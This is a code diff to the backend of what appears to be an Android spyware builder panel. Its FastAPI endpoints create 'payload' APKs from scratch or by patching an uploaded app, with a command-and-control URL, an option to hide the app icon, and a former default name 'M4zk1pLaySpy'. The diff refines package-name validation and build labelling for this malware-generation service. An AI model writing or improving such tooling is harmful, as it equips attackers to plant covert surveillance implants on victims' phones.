@@ -11,7 +11,6 @@ from fastapi import APIRouter, Depends, File, Form, HTTPException, UploadFile
 from fastapi.responses import FileResponse
 
 from . import builder, config, db, security
-from .ws import hub
 
 router = APIRouter(prefix="/api/build", dependencies=[Depends(security.require_operator)])
 
@@ -44,7 +43,7 @@ async def status(build_id: str) -> dict:
 @router.post("/create")
 async def create(
     mode: str = Form("new"),
-    name: str = Form("M4zk1pLaySpy"),
+    name: str = Form(""),
     package: str = Form(""),
     c2_url: str = Form(""),
     hide: str = Form("0"),
@@ -58,9 +57,14 @@ async def create(
     if mode == "patch" and apk is None:
         raise HTTPException(400, "APK resmi wajib diunggah untuk mode patch")
 
-    pkg = package.strip() or f"ai.m4zk1play.{secrets.token_hex(3)}"
-    if not PKG_RE.match(pkg):
-        raise HTTPException(400, "Format package tidak valid (contoh: com.app.saya)")
+    pkg = package.strip()
+    if mode == "new":
+        if not pkg:
+            pkg = f"ai.m4zk1play.{secrets.token_hex(3)}"
+        if not PKG_RE.match(pkg):
+            raise HTTPException(400, "Format package tidak valid (contoh: com.app.saya)")
+    elif pkg and not PKG_RE.match(pkg):
+        raise HTTPException(400, "Format package tidak valid")
 
     src = _save_upload(apk, "src")
     icon_path = _save_upload(icon, "icon")
@@ -76,13 +80,15 @@ async def create(
         "email": str(config.get("contact_email")),
         "team": str(config.get("contact_team")),
         "hide": hide in {"1", "true", "on"},
-        "label": name.strip() or "M4zk1pLaySpy",
+        "label": name.strip(),
         "wizard": wizard,
         "icon": str(icon_path) if icon_path else "",
         "wallpaper": str(wall_path) if wall_path else "",
     }
 
-    build_id = builder.create_build(opts["label"], pkg, mode, src, opts)
+    build_id = builder.create_build(
+        opts["label"] or pkg or "payload", pkg, mode, src, opts
+    )
     asyncio.create_task(builder.run_job(build_id, mode, src, opts))
     db.audit("build", f"{mode} :: {pkg}")
     return {"ok": True, "id": build_id, "package": pkg, "token": token, "c2_url": public}
@@ -106,8 +112,11 @@ async def download(build_id: str) -> FileResponse:
     path = Path(row["outfile"])
     if not path.exists():
         raise HTTPException(410, "File build hilang")
-    return FileResponse(path, filename=f"{row['name'] or 'payload'}.apk",
-                        media_type="application/vnd.android.package-archive")
+    return FileResponse(
+        path,
+        filename=f"{row['name'] or 'payload'}.apk",
+        media_type="application/vnd.android.package-archive",
+    )
 
 
 @router.delete("/{build_id}")
